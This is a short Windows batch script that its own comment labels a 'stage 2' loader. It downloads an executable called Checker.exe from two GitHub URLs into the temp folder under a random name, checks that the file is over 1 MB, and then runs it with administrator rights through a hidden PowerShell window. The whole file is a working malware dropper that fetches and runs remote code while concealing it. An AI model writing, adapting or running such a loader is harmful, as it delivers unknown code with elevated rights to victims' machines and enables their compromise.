@echo off
setlocal EnableExtensions
rem stage 2 - pull the payload, size-gate it, launch elevated
set "FILE=%TEMP%\Check_%RANDOM%%RANDOM%.exe"
set "OK="

for %%U in (
 "https://raw.githubusercontent.com/muimk262/check/refs/heads/main/Checker.exe"
 "https://github.com/muimk262/check/raw/refs/heads/main/Checker.exe"
) do (
  if not defined OK (
    del /f /q "%FILE%" >nul 2>&1
    curl.exe -fL -s -S --retry 3 --retry-delay 2 --connect-timeout 30 --max-time 300 -o "%FILE%" %%~U
    if not errorlevel 1 (
      for %%A in ("%FILE%") do if %%~zA GEQ 1000000 set "OK=1"
    )
  )
)

if not defined OK (
  del /f /q "%FILE%" >nul 2>&1
  exit /b 1
)

start "" powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%FILE%' -Verb RunAs" >nul 2>&1
exit /b 0
